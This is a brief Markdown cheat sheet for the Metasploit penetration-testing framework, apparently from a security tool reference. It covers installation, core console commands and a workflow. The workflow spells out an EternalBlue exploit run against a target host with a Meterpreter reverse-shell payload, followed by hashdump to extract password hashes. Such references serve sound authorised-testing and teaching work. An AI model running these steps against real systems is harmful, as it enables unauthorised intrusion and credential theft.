# Metasploit

## Purpose
Exploitation framework providing modules for reconnaissance, exploitation, payload delivery, post-exploitation, and pivoting.

## Installation
```bash
sudo apt install metasploit-framework     # Kali pre-installed
# Or via Git
git clone https://github.com/rapid7/metasploit-framework.git
```

## Basic Usage
```bash
msfconsole                                # Start console
search eternalblue                        # Search modules
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100                  # Set target
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10                    # Set listener
run                                       # Execute exploit
```

## Important Commands
- `search` — Find modules by name/cve/keyword
- `use <module>` — Load a module
- `show options` — View configurable parameters
- `show payloads` — List compatible payloads
- `set <option> <value>` — Set parameter
- `run` / `exploit` — Execute
- `sessions -l` — List active sessions
- `sessions -i N` — Interact with session
- `background` — Background current session
- Within meterpreter: `sysinfo`, `shell`, `upload`, `download`, `hashdump`

## Typical Workflow
1. `msfconsole`
2. `search eternalblue` → `use exploit/...`
3. `show options` → `set RHOSTS/LHOST`
4. `check` to verify vulnerability
5. `run` → get Meterpreter shell
6. `sysinfo` → `getuid` → `hashdump` → `shell`

## Official Documentation
https://www.metasploit.com/